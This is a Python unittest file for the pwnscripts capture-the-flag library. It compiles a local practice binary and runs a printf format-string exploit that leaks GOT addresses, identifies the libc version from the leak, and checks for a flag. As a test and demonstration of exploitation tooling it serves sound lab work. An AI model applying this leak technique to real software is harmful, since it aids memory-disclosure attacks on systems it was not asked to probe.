'''A number of tests for pwnscripts.
This file contains tests that are too unpredictable, too burdensome to automate,
or otherwise unwanted in the automated tests for specific reasons.

This file also serves to demonstrate some of the features of pwnscripts,
showing off common use-cases and best practices.
'''
import unittest as ut
from pwnscripts import *

class BinTests(ut.TestCase):
    def test_A_common_sense(self):
        # check base necessities
        for i in [2]: assert not path.isfile('%d.out'%i)
        assert path.isfile('/usr/bin/gcc')
    
    def test_libc_db(self):
        print()
        try:
            system('./examples/2.c')    # compile the program
            context.log_level = 'warn'
            context.binary = '2.out'
            proc = {'argv':['./2.out'], 'env':{"LD_PRELOAD": "examples/ld-2.27.so examples/libc.so.6"}}
            GOT_table = ['__libc_start_main', 'printf', 'fgets']
            GOT_addrs = list(map(lambda s: context.binary.got[s], GOT_table))
            
            @context.quiet
            def printf(l:str):
                r = process(**proc)
                r.send(l)
                return r.recvline()
            with context.local(log_level='info'):   # show info for testing purposes
                buf_off = fsb.find_offset.buffer(printf, maxlen=63)

            # send a printf GOT table leak exploit
            r = process(**proc)
            payload = fsb.leak.deref_payload(buf_off, GOT_addrs)
            assert len(payload) < 64
            r.sendline(payload)
            
            # grab the leaked addresses and pass them to libc_find() for detection
            libc_addrs = map(lambda b:extract_first_bytes(b,6),fsb.leak.deref_extractor(r.recvall()))
            libc_dict = dict(zip(GOT_table, libc_addrs))
            path_to_libcdb = 'libc-database'
            if not path.isdir(path_to_libcdb):
                path_to_libcdb = input("path to libc-database: ").strip()
            assert path.isdir(path_to_libcdb)
            context.libc_database = path_to_libcdb
            with context.local(log_level='info'):   # show info for testing purposes
                context.libc = context.libc_database.libc_find(libc_dict)
                # NOTE: I have no idea how this leaks out into the global context. Danger!

            # test the libc id found
            r = process(**proc)
            r.sendline(context.libc.id)
            r.recvline()
            self.assertEqual(r.recvline().strip(), b'flag{congrats}')
            
        finally:
            system('rm 2.out')
    # TODO: tests for ROP
if __name__ == '__main__':
    ut.main()
